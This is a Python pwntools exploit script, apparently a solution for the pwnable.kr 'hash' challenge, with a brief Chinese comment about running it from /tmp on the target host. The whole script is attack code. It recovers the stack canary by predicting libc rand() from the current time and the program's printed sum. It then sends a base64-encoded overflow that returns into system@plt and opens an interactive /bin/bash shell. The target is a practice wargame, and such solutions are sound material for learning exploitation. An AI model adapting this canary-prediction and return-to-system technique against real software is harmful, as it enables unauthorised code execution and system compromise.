## 这个是拿去他本机上打的, 找个以前的shel,写到tmp目录直接运行
from pwn import *
context(arch='i386',os='linux',log_level='debug')
import ctypes
import sys

ll = ctypes.cdll.LoadLibrary
lib = ll('libc.so.6')

if sys.argv[1] == 'connect':
    bin = remote('pwnable.kr',9002)
else:
    bin = process('./hash')

lib.srand(lib.time(0))
v2 = lib.rand()
v3 = lib.rand()
v4 = lib.rand()
v5 = lib.rand()
v6 = lib.rand()
v7 = lib.rand()
v8 = lib.rand()
v9 = lib.rand()


system_plt = 0x8048880
process_hash = 0x08048f92
bin.recvuntil(': ')
sum_v = int(bin.recvuntil('\n'))
canary = sum_v + v8 + v5 - v6 - v9 - v4 - v3 - v7
canary = canary & 0xffffffff
log.success('canary is : '+ hex(canary))
payload = 'a'*0x200
payload += p32(canary) + 'a'*0xc
payload += p32(process_hash) + p32(system_plt) + 'a'*4 + p32(0x0804B0E0)
payload = base64.b64encode(payload)
bin.sendline(str(sum_v))
bin.sendline(payload)
bin.sendline('/bin/bash')
bin.recvuntil('\n')
#gdb.attach(bin)
bin.interactive()

